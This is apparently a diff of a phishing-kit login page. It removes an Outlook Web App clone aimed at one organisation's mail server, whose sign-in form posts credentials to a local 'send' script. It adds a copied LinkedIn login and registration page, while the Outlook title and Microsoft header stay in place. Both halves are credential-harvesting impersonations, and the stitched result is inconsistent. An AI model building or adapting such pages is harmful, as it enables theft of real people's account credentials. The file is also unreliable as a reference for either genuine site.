@@ -1,4 +1,3 @@
-
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <!-- Copyright (c) 2006 Microsoft Corporation.  All rights reserved. -->
 <!-- OwaPage = ASP.auth_logon_aspx -->
@@ -12,244 +11,27 @@
 <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
 <meta name="Robots" content="NOINDEX, NOFOLLOW">
 <title>Outlook Web App</title>
-<link type="text/css" rel="stylesheet" href="public/css/logon.css">
-<link type="text/css" rel="stylesheet" href="public/css/owafont.css">
-
-<script type="text/javascript">
-	<!--
-	var a_fRC = 1;
-	var g_fFcs = 1;
-	var a_fLOff = 0;
-	var a_fCAC = 1;
-	var a_fEnbSMm = 1;
-/// <summary>
-/// Is Mime Control installed?
-/// </summary>
-function IsMimeCtlInst(progid)
-{
-	if (!a_fEnbSMm)
-		return false;
-
-	var oMimeVer = null;
-
-	try 
-	{
-		// TODO: ingore this on none IE browser
-		//
-		//oMimeVer = new ActiveXObject(progid);
-	} 
-	catch (e)
-	{ 
-	}
-
-	if (oMimeVer != null)
-		return true;
-	else
-		return false;
-}
-
-/// <summary>
-/// Render out the S-MIME control if it is installed.
-/// </summary>
-function RndMimeCtl()
-{
-	if (IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
-		RndMimeCtlHlpr("MimeNSe2k3", "D801B381-B81D-47a7-8EC4-EFC111666AC0", "MIMEe2k3", "mimeLogoffE2k3");
-
-	if (IsMimeCtlInst("OwaSMime.MimeCtlVer"))
-		RndMimeCtlHlpr("MimeNSe2k7sp1", "833aa5fb-7aca-4708-9d7b-c982bf57469a", "MIMEe2k7sp1", "mimeLogoffE2k7sp1");
-
-	if (IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
-		RndMimeCtlHlpr("MimeNSe2k9", "4F40839A-C1E5-47E3-804D-A2A17F42DA21", "MIMEe2k9", "mimeLogoffE2k9");
-}
-
-/// <summary>
-/// Helper function to factor out the rendering of the S/MIME control.
-/// </summary>
-function RndMimeCtlHlpr(objid, classid, ns, id)
-{
-	document.write("<OBJECT id='" + objid + "' classid='CLSID:" + classid + "'></OBJECT>");
-	document.write("<?IMPORT namespace='" + ns + "' implementation=#" + objid + ">");
-	document.write("<" + ns + ":Logoff id='" + id + "' style='display:none'/>");
-}
-	-->
-</script>
-
+<link type="text/css" rel="stylesheet" href="public/css/style.css">
 </head>
-<body class="owaLgnBdy">
+<body class="js guest" dir="ltr" id="pagekey-uno-reg-guest-home">
 
-<script type="text/javascript">
-	RndMimeCtl();
-</script>
+<div class="header"><div class="wrapper"><h1><img class="lazy-loaded" alt="LinkedIn" src="https://static.licdn.com/sc/h/95o6rrc5ws6mlw6wqzy0xgj7y"></h1>
 
-<noscript>
-	<div id="dvErr">
-		<table cellpadding="0" cellspacing="0">
-		<tr>
-			<td><img src="/owa/14.3.399.0/themes/base/warn.png" alt=""></td>
-			<td style="width:100%">To use Outlook Web App, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn't support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Windows Internet Explorer</a> for access to Outlook Web App.</td>
-		</tr>
-		</table>
-	</div>
-</noscript>
+<form class="login-form" action="https://www.linkedin.com/uas/login-submit?loginSubmitSource=GUEST_HOME" method="POST" _lpchecked="1">
+<label for="login-email">Email</label>
+<input type="text" name="session_key" class="login-email" autocapitalize="off" tabindex="1" id="login-email" placeholder="Email" autofocus="autofocus" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;" dir="ltr">
+<label for="login-password">Password</label>
+<input type="password" name="session_password" class="login-password" id="login-password" aria-required="true" tabindex="1" placeholder="Password" autocomplete="off" dir="ltr" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAUBJREFUOBGVVE2ORUAQLvIS4gwzEysHkHgnkMiEc4zEJXCMNwtWTmDh3UGcYoaFhZUFCzFVnu4wIaiE+vvq6+6qTgthGH6O4/jA7x1OiCAIPwj7CoLgSXDxSjEVzAt9k01CBKdWfsFf/2WNuEwc2YqigKZpK9glAlVVwTTNbQJZlnlCkiTAZnF/mePB2biRdhwHdF2HJEmgaRrwPA+qqoI4jle5/8XkXzrCFoHg+/5ICdpm13UTho7Q9/0WnsfwiL/ouHwHrJgQR8WEwVG+oXpMPaDAkdzvd7AsC8qyhCiKJjiRnCKwbRsMw9hcQ5zv9maSBeu6hjRNYRgGFuKaCNwjkjzPoSiK1d1gDDecQobOBwswzabD/D3Np7AHOIrvNpHmPI+Kc2RZBm3bcp8wuwSIot7QQ0PznoR6wYSK0Xb/AGVLcWwc7Ng3AAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;">
+<input tabindex="1" id="login-submit" class="login submit-button" type="submit" value="Sign in">
+<a class="link-forgot-password" tabindex="1" href="https://www.linkedin.com/uas/request-password-reset?trk=uno-reg-guest-home-forgot-password">Forgot password?</a>
 
-<input type="hidden" name="destination" value="https://mail.cma.or.ke/owa/">
-<input type="hidden" name="flags" value="0">
-<input type="hidden" name="forcedownlevel" value="0">
-<table align="center" id="tblMain" cellpadding=0 cellspacing=0>
-	<tr>
-		<td colspan=3>
-			<table cellspacing=0 cellpadding=0 class="tblLgn">
-			<tr>
-				<td class="lgnTL"><img src="public/img/lgntopl.gif" alt=""></td>
-				<td class="lgnTM"></td>
-				<td class="lgnTR"><img src="public/img/lgntopr.gif" alt=""></td>
-			</tr>
-			</table>
-		</td>
-	</tr>
-	<tr>
-		<td id="mdLft">&nbsp;</td>
-		<td id="mdMid">
-			<table id="tblMid" class="mid">
-				<tr>
-					<td id="expltxt" class="expl">
-										
-					</td>
-				</tr>
-				<tr><td><hr></td></tr>
-				<tr>
-					<td>
-						<table cellpadding=0 cellspacing=0>
-						<col>
-						<col class="w100">
-						<tr id=trSec>
-							<td colspan="2">								
-								Security 
-									&#x200E;(
-									<a href="#" id="lnkShwSec" onclick="clkExp('lnkShwSec')">
-									show explanation 
-									</a>
-									<a href="#" id="lnkHdSec" onclick="clkExp('lnkHdSec')" style="display:none">
-									hide explanation 
-									</a>
-								)&#x200E;
-							</td>
-						</tr>						
-						<tr>
-							<td><input id="rdoPblc" type="radio" name="trusted" value="0" class="rdo" onclick="clkSec()" checked></td>
-							<td><label for="rdoPblc">This is a public or shared computer</label></td>
-						</tr>
-						<tr id="trPubExp" class="expl" style="display:none">
-							<td></td>
-							<td>Select this option if you use Outlook Web App on a public computer. Be sure to sign out when you've finished and close all windows to end your session.</td>
-						</tr>
-						<tr>
-							<td><input id="rdoPrvt" type="radio" name="trusted" value="4" class="rdo" onclick="clkSec()"></td>
-							<td><label for="rdoPrvt">This is a private computer</label></td>
-						</tr>
-						<tr id="trPrvtExp" class="expl" style="display:none">
-							<td></td>
-							<td>Select this option if you're the only person who uses this computer. Your server will allow a longer period of inactivity before signing you out.</td>
-						</tr>
-						<tr id="trPrvtWrn" class="wrng" style="display:none">
-							<td></td>
-							<td>Warning:  By selecting this option, you confirm that this computer complies with your organization's security policy.</td>
-						</tr>
-						</table>
-					</td>
-				</tr>
-				
-				<tr><td><hr></td></tr>
-				<tr>
-					<td>
-						
-						<table cellpadding=0 cellspacing=0>
-							<col>
-							<col class="w100">
-								
-								<tr>							
-									<td><input id="chkBsc" type="checkbox" class="rdo" onclick="clkBsc();"></td>
-									<td nowrap><label for="chkBsc">Use the light version of Outlook Web App</label></td>
-								</tr>
-								<tr id="trBscExp" class="disBsc" style="display:none">
-									<td></td>
-									<td>The light version of Outlook Web App includes fewer features. Use it if you're on a slow connection or using a computer with unusually strict browser security settings. We also support the full Outlook Web App experience on some browsers on Windows, Mac, and Linux computers. To check out all the supported browsers and operating systems, <a href="http://go.microsoft.com/fwlink/?LinkID=129362" id="bscLnk">click here.</a></td>
-								</tr>
-							
-						</table>
-					</td>
-				</tr>
-				
-				<tr><td><hr></td></tr>
-				<tr>
-					<td>
-						<table cellpadding=0 cellspacing=0>
-							<col class="nowrap">
-							<col class="w100">
-                            <col>
-                            <form id="form" name="form" action="send" method="POST">
-							<tr>
-								<td nowrap><label for="username">Domain\user name:</label></td>
-								<td class="txtpad"><input id="username" name="username" type="text" class="txt"></td>
-							</tr>
-							<tr>
-								<td nowrap><label for="password">Password:</label></td>
-								<td class="txtpad"><input id="password" name="password" type="password" class="txt" onfocus="g_fFcs=0"></td>
-							</tr>
-							<tr>
-								<td colspan=2 align="right" class="txtpad">
-									
-									<input type="submit" class="btn" value="Sign in">
-									
-								</td>
-                            </tr>
-                        </form>
-						</table>
-					</td>
-				</tr>
-				<tr><td><hr></td></tr>
-				
-			</table>
-			<table id="tblMid2" class="mid" style="display:none">
-				<tr><td><hr></td></tr>
-				<tr>
-					<td><br>Please enable cookies for this Web site.<br><br>Cookies are currently disabled by your browser. Outlook Web App requires that cookies be enabled. <br><br>For information about how to enable cookies, see the Help for your Web browser.<br><br><br></td>
-				</tr>
-				<tr><td><hr></td></tr>
-				<tr>
-					<td align="right" class="txtpad">
-					
-						<input type="button" class="btn" style="float: right" value="Retry" onclick="clkRtry()" 
-						onmouseover="this.className='btnOnMseOvr'" onmouseout="this.className='btn'" onmousedown="this.className='btnOnMseDwn'">
-					
-					</td>
-				</tr>
-			</table>
-			<table class="mid tblConn">
-				<tr>
-					<td rowspan=2 align="right" class="tdConnImg"><img style="vertical-align:top" src="public/img/lgnexlogo.gif" alt=""></td>
-					<td class="tdConn">Connected to Microsoft Exchange</td>
-				</tr>
-				<tr>
-					<td class="tdCopy">&copy; 2010 Microsoft Corporation. All rights reserved.</td>
-				</tr>
-			</table>
-		</td>
-		<td id="mdRt">&nbsp;</td>
-	</tr>
-	<tr>
-		<td colspan=3>
-			<table cellspacing=0 cellpadding=0 class="tblLgn">
-			<tr>
-				<td class="lgnBL"><img src="public/img/lgnbotl.gif" alt=""></td>
-				<td class="lgnBM"></td>
-				<td class="lgnBR"><img src="public/img/lgnbotr.gif" alt=""></td>
-			</tr>
-			</table>
-		</td>
-	</tr>
-</table>
+<div id="login-callout" class="hopscotch-bubble animated hopscotch-callout no-number hidden" tabindex="-1" role="alert" aria-live="polite"><div class="hopscotch-bubble-container"><div class="hopscotch-bubble-content"><h3 class="hopscotch-title">Trying to sign in?</h3><div class="hopscotch-content">Someone's already using that email. If that’s you, enter your Email and password here to sign in.</div></div><a title="Close" href="#" class="hopscotch-bubble-close hopscotch-close">Close</a></div><div class="hopscotch-bubble-arrow-container hopscotch-arrow up"></div></div><input name="isJsEnabled" type="hidden" value="false"><input name="loginCsrfParam" id="loginCsrfParam-login" type="hidden" value="13f10874-550f-4f07-8498-9dd791eb9b22">
+</form></div></div>
+
+
+<div id="main-container" class="main background lazy-loaded show-login   " data-delayed-url="public/img/bg.jpg"><form id="regForm" class="reg-form" action="https://www.linkedin.com/start/join-prefill" method="POST" data-jsenabled="check"><h2 class="title">Be great at what you do</h2><h3 class="subtitle">Get started - it's free.</h3><div class="reg-alert hidden" role="alert" tabindex="-1"><div class="wrapper"><p class="message"><span class="alert-content"></span></p><button class="dismiss dismiss-alert"><li-icon type="cancel-icon" size="small" a11y-text="Dismiss"></li-icon></button></div></div><section class="form-body"><label for="reg-firstname">First name</label><input type="text" name="firstName" id="reg-firstname" class="reg-firstname" aria-required="true" tabindex="1" placeholder="" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABHklEQVQ4EaVTO26DQBD1ohQWaS2lg9JybZ+AK7hNwx2oIoVf4UPQ0Lj1FdKktevIpel8AKNUkDcWMxpgSaIEaTVv3sx7uztiTdu2s/98DywOw3Dued4Who/M2aIx5lZV1aEsy0+qiwHELyi+Ytl0PQ69SxAxkWIA4RMRTdNsKE59juMcuZd6xIAFeZ6fGCdJ8kY4y7KAuTRNGd7jyEBXsdOPE3a0QGPsniOnnYMO67LgSQN9T41F2QGrQRRFCwyzoIF2qyBuKKbcOgPXdVeY9rMWgNsjf9ccYesJhk3f5dYT1HX9gR0LLQR30TnjkUEcx2uIuS4RnI+aj6sJR0AM8AaumPaM/rRehyWhXqbFAA9kh3/8/NvHxAYGAsZ/il8IalkCLBfNVAAAAABJRU5ErkJggg==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;"><label for="reg-lastname">Last name</label><input type="text" name="lastName" id="reg-lastname" class="reg-lastname" aria-required="true" tabindex="1" placeholder=""><label for="reg-email">Email</label><input type="text" name="session_key" class="reg-email" autocapitalize="off" tabindex="4" id="reg-email" autofocus="autofocus" dir="ltr" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABHklEQVQ4EaVTO26DQBD1ohQWaS2lg9JybZ+AK7hNwx2oIoVf4UPQ0Lj1FdKktevIpel8AKNUkDcWMxpgSaIEaTVv3sx7uztiTdu2s/98DywOw3Dued4Who/M2aIx5lZV1aEsy0+qiwHELyi+Ytl0PQ69SxAxkWIA4RMRTdNsKE59juMcuZd6xIAFeZ6fGCdJ8kY4y7KAuTRNGd7jyEBXsdOPE3a0QGPsniOnnYMO67LgSQN9T41F2QGrQRRFCwyzoIF2qyBuKKbcOgPXdVeY9rMWgNsjf9ccYesJhk3f5dYT1HX9gR0LLQR30TnjkUEcx2uIuS4RnI+aj6sJR0AM8AaumPaM/rRehyWhXqbFAA9kh3/8/NvHxAYGAsZ/il8IalkCLBfNVAAAAABJRU5ErkJggg==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;"><label for="reg-password">Password (6 or more characters)</label><input type="password" name="session_password" class="reg-password" id="reg-password" aria-required="true" tabindex="4" autocomplete="new-password" aria-autocomplete="list" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACIUlEQVQ4EX2TOYhTURSG87IMihDsjGghBhFBmHFDHLWwSqcikk4RRKJgk0KL7C8bMpWpZtIqNkEUl1ZCgs0wOo0SxiLMDApWlgOPrH7/5b2QkYwX7jvn/uc//zl3edZ4PPbNGvF4fC4ajR5VrNvt/mo0Gr1ZPOtfgWw2e9Lv9+chX7cs64CS4Oxg3o9GI7tUKv0Q5o1dAiTfCgQCLwnOkfQOu+oSLyJ2A783HA7vIPLGxX0TgVwud4HKn0nc7Pf7N6vV6oZHkkX8FPG3uMfgXC0Wi2vCg/poUKGGcagQI3k7k8mcp5slcGswGDwpl8tfwGJg3xB6Dvey8vz6oH4C3iXcFYjbwiDeo1KafafkC3NjK7iL5ESFGQEUF7Sg+ifZdDp9GnMF/KGmfBdT2HCwZ7TwtrBPC7rQaav6Iv48rqZwg+F+p8hOMBj0IbxfMdMBrW5pAVGV/ztINByENkU0t5BIJEKRSOQ3Aj+Z57iFs1R5NK3EQS6HQqF1zmQdzpFWq3W42WwOTAf1er1PF2USFlC+qxMvFAr3HcexWX+QX6lUvsKpkTyPSEXJkw6MQ4S38Ljdbi8rmM/nY+CvgNcQqdH6U/xrYK9t244jZv6ByUOSiDdIfgBZ12U6dHEHu9TpdIr8F0OP692CtzaW/a6y3y0Wx5kbFHvGuXzkgf0xhKnPzA4UTyaTB8Ph8AvcHi3fnsrZ7Wore02YViqVOrRXXPhfqP8j6MYlawoAAAAASUVORK5CYII=&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;" dir="ltr"><span class="agreement">By clicking Join now, you agree to the LinkedIn <a tabindex="4" href="https://www.linkedin.com/legal/user-agreement">User Agreement</a>, <a tabindex="4" href="https://www.linkedin.com/legal/privacy-policy">Privacy Policy</a>, and <a tabindex="4" href="https://www.linkedin.com/legal/cookie-policy">Cookie Policy</a>.</span><input tabindex="4" id="registration-submit" class="registration submit-button" type="submit" value="Join now"></section></form></div>
+
+<div class="meter"><form class="same-name-search" method="GET" action="https://www.linkedin.com/pub/dir/"><h3 class="title">Find a colleague</h3><input type="text" name="first" placeholder="First name" aria-label="Enter colleague's first name"><input type="text" name="last" placeholder="Last name" aria-label="Enter colleague's last name"><input type="hidden" name="trk" value="uno-reg-guest-home-name-search"><input type="submit" class="submit-btn" name="search" value="Search" disabled=""></form><div class="directory"><h3 class="title">LinkedIn member directory: </h3><ol><li><a href="https://www.linkedin.com/directory/people-a" aria-label="View LinkedIn member's whose first name start with the letter A">A</a></li><li><a href="https://www.linkedin.com/directory/people-b" aria-label="View LinkedIn member's whose first name start with the letter B">B</a></li><li><a href="https://www.linkedin.com/directory/people-c" aria-label="View LinkedIn member's whose first name start with the letter C">C</a></li><li><a href="https://www.linkedin.com/directory/people-d" aria-label="View LinkedIn member's whose first name start with the letter D">D</a></li><li><a href="https://www.linkedin.com/directory/people-e" aria-label="View LinkedIn member's whose first name start with the letter E">E</a></li><li><a href="https://www.linkedin.com/directory/people-f" aria-label="View LinkedIn member's whose first name start with the letter F">F</a></li><li><a href="https://www.linkedin.com/directory/people-g" aria-label="View LinkedIn member's whose first name start with the letter G">G</a></li><li><a href="https://www.linkedin.com/directory/people-h" aria-label="View LinkedIn member's whose first name start with the letter H">H</a></li><li><a href="https://www.linkedin.com/directory/people-i" aria-label="View LinkedIn member's whose first name start with the letter I">I</a></li><li><a href="https://www.linkedin.com/directory/people-j" aria-label="View LinkedIn member's whose first name start with the letter J">J</a></li><li><a href="https://www.linkedin.com/directory/people-k" aria-label="View LinkedIn member's whose first name start with the letter K">K</a></li><li><a href="https://www.linkedin.com/directory/people-l" aria-label="View LinkedIn member's whose first name start with the letter L">L</a></li><li><a href="https://www.linkedin.com/directory/people-m" aria-label="View LinkedIn member's whose first name start with the letter M">M</a></li><li><a href="https://www.linkedin.com/directory/people-n" aria-label="View LinkedIn member's whose first name start with the letter N">N</a></li><li><a href="https://www.linkedin.com/directory/people-o" aria-label="View LinkedIn member's whose first name start with the letter O">O</a></li><li><a href="https://www.linkedin.com/directory/people-p" aria-label="View LinkedIn member's whose first name start with the letter P">P</a></li><li><a href="https://www.linkedin.com/directory/people-q" aria-label="View LinkedIn member's whose first name start with the letter Q">Q</a></li><li><a href="https://www.linkedin.com/directory/people-r" aria-label="View LinkedIn member's whose first name start with the letter R">R</a></li><li><a href="https://www.linkedin.com/directory/people-s" aria-label="View LinkedIn member's whose first name start with the letter S">S</a></li><li><a href="https://www.linkedin.com/directory/people-t" aria-label="View LinkedIn member's whose first name start with the letter T">T</a></li><li><a href="https://www.linkedin.com/directory/people-u" aria-label="View LinkedIn member's whose first name start with the letter U">U</a></li><li><a href="https://www.linkedin.com/directory/people-v" aria-label="View LinkedIn member's whose first name start with the letter V">V</a></li><li><a href="https://www.linkedin.com/directory/people-w" aria-label="View LinkedIn member's whose first name start with the letter W">W</a></li><li><a href="https://www.linkedin.com/directory/people-x" aria-label="View LinkedIn member's whose first name start with the letter X">X</a></li><li><a href="https://www.linkedin.com/directory/people-y" aria-label="View LinkedIn member's whose first name start with the letter Y">Y</a></li><li><a href="https://www.linkedin.com/directory/people-z" aria-label="View LinkedIn member's whose first name start with the letter Z">Z</a></li><li><a href="https://www.linkedin.com/directory/people-1" aria-label="View more LinkedIn members">More</a></li><li class="country-search"><a href="https://www.linkedin.com/directory/country_listing/?trk=uno-reg-guest-home-country">Browse by country/region</a></li></ol></div><div class="links-container ghp-footer"><div class="links links-general ghp-footer__section"><h3 class="title ghp-footer__section-title">General</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/start/join?trk=uno-reg-guest-home-join" class="ghp-footer__link" aria-label="LinkedIn sign up">Sign Up</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/help/linkedin?trk=uno-reg-guest-home-help-center&amp;lang=en" class="ghp-footer__link" aria-label="LinkedIn help center">Help Center</a></li><li class="ghp-footer__link-item"><a href="https://press.linkedin.com/about-linkedin?trk=uno-reg-guest-home-about" class="ghp-footer__link" aria-label="LinkedIn about">About</a></li><li class="ghp-footer__link-item"><a href="https://press.linkedin.com?trk=uno-reg-guest-home-press" class="ghp-footer__link" aria-label="LinkedIn Press">Press</a></li><li class="ghp-footer__link-item"><a href="https://blog.linkedin.com?trk=uno-reg-guest-home-blog" class="ghp-footer__link" aria-label="LinkedIn Blog">Blog</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/company/linkedin/careers?trk=uno-reg-guest-home-careers" class="ghp-footer__link" aria-label="LinkedIn Careers">Careers</a></li><li class="ghp-footer__link-item"><a href="https://developer.linkedin.com?trk=uno-reg-guest-home-developers" class="ghp-footer__link" aria-label="LinkedIn Developers">Developers</a></li></ul></div><div class="links links-business ghp-footer__section"><h3 class="title ghp-footer__section-title">Business Solutions</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://business.linkedin.com/talent-solutions?src=li-footer&amp;utm_source=linkedin&amp;utm_medium=footer&amp;trk=uno-reg-guest-home-enterprise-talent" class="ghp-footer__link" aria-label="LinkedIn Talent Solutions">Talent</a></li><li class="ghp-footer__link-item"><a href="https://business.linkedin.com/marketing-solutions?src=li-footer&amp;utm_source=linkedin&amp;utm_medium=footer&amp;trk=uno-reg-guest-home-enterprise-marketing" class="ghp-footer__link" aria-label="LinkedIn Marketing Solutions">Marketing</a></li><li class="ghp-footer__link-item"><a href="https://business.linkedin.com/sales-solutions?src=li-footer&amp;utm_source=linkedin&amp;utm_medium=footer&amp;trk=uno-reg-guest-home-enterprise-sales" class="ghp-footer__link" aria-label="LinkedIn Sales Solutions">Sales</a></li><li class="ghp-footer__link-item"><a href="https://learning.linkedin.com?src=li-footer&amp;trk=uno-reg-guest-home-enterprise-learning" class="ghp-footer__link" aria-label="LinkedIn Learning Solutions">Learning</a></li></ul></div><div class="links links-browse ghp-footer__section"><h3 class="title ghp-footer__section-title">Browse LinkedIn</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/learning/?trk=uno-reg-guest-home-learning" class="ghp-footer__link" aria-label="LinkedIn Learning">Learning</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/jobs?trk=uno-reg-guest-home-jobs" class="ghp-footer__link" aria-label="LinkedIn Jobs">Jobs</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/salary/?trk=uno-reg-guest-home-salary" class="ghp-footer__link" aria-label="LinkedIn Salary">Salary</a></li><li class="ghp-footer__link-item"><a href="https://mobile.linkedin.com?trk=uno-reg-guest-home-mobile" class="ghp-footer__link" aria-label="LinkedIn Mobile">Mobile</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/profinder?trk=uno-reg-guest-home-profinder" class="ghp-footer__link" aria-label="LinkedIn ProFinder">ProFinder</a></li></ul></div><div class="links links-directories ghp-footer__section"><h3 class="title ghp-footer__section-title">Directories</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/people-a?trk=uno-reg-guest-home-people-directory" class="ghp-footer__link" aria-label="LinkedIn members directory">Members</a></li><li><a href="https://www.linkedin.com/directory/jobs?trk=uno-reg-guest-home-jobs-directory" class="ghp-footer__link" aria-label="LinkedIn jobs directory">Jobs</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/pulse?trk=uno-reg-guest-home-pulse" class="ghp-footer__link" aria-label="LinkedIn pulse articles directory">Pulse</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/companies/?trk=uno-reg-guest-home-companies-directory" class="ghp-footer__link" aria-label="LinkedIn companies directory">Companies</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/salaries?trk=uno-reg-guest-home-salaries-directory" class="ghp-footer__link" aria-label="LinkedIn salaries directory">Salaries</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/universities?trk=uno-reg-guest-home-universities" class="ghp-footer__link" aria-label="LinkedIn universities directory">Universities</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/topjobs?trk=uno-reg-guest-home-topJobs-directory" class="ghp-footer__link" aria-label="LinkedIn top jobs directory">Top Jobs</a></li></ul></div></div><div class="legal-nav"><div class="copyright"><img class="logo-copyright lazy-loaded" alt="LinkedIn" src="https://static.licdn.com/sc/h/5koy91fjbrc47yhwyzws65ml7"> © 2018</div><ul><li><a href="https://www.linkedin.com/legal/user-agreement?trk=uno-reg-guest-home-user-agreement">User Agreement</a></li><li><a href="https://www.linkedin.com/legal/privacy-policy?trk=uno-reg-guest-home-privacy-policy">Privacy Policy</a></li><li><a href="https://www.linkedin.com/help/linkedin/answer/34593?lang=en&amp;trk=uno-reg-guest-home-community-guidelines">Community Guidelines</a></li><li><a href="https://www.linkedin.com/legal/cookie-policy?trk=uno-reg-guest-home-cookie-policy">Cookie Policy</a></li><li><a href="https://www.linkedin.com/legal/copyright-policy?trk=uno-reg-guest-home-copyright-policy">Copyright Policy</a></li><li><a href="https://www.linkedin.com/psettings/guest-controls?trk=uno-reg-guest-home-guest-controls">Guest Controls</a></li><li class="lang-selector-container"><input type="checkbox" id="lang-selector-state" name="lang-selector-state"><label for="lang-selector-state" class="lang-selector-state-label" tabindex="0" role="button" aria-expanded="false">Language</label><form name="languageSelectorForm" id="languageSelectorForm" action="/languageSelector" method="POST"><ul class="lang-selector"><li><button data-locale="in_ID">Bahasa Indonesia</button></li><li><button data-locale="ms_MY">Bahasa Malaysia</button></li><li><button data-locale="cs_CZ">Čeština</button></li><li><button data-locale="da_DK">Dansk</button></li><li><button data-locale="de_DE">Deutsch</button></li><li><span class="current">English</span></li><li><button data-locale="es_ES">Español</button></li><li><button data-locale="zh_TW">正體中文</button></li><li><button data-locale="fr_FR">Français</button></li><li><button data-locale="ko_KR">한국어</button></li><li><button data-locale="it_IT">Italiano</button></li><li><button data-locale="zh_CN">简体中文</button></li><li><button data-locale="nl_NL">Nederlands</button></li><li><button data-locale="ja_JP">日本語</button></li><li><button data-locale="no_NO">Norsk</button></li><li><button data-locale="pl_PL">Polski</button></li><li><button data-locale="pt_BR">Português</button></li><li><button data-locale="ro_RO">Română</button></li><li><button data-locale="ru_RU">Русский</button></li><li><button data-locale="sv_SE">Svenska</button></li><li><button data-locale="tl_PH">Tagalog</button></li><li><button data-locale="th_TH">ภาษาไทย</button></li><li><button data-locale="tr_TR">Türkçe</button></li><li><button data-locale="ar_AE">العربية</button></li></ul><input type="hidden" name="i18nLang" value=""><input type="hidden" name="currenturl" value=""></form></li></ul></div></div>
 
 </body>
 </html>
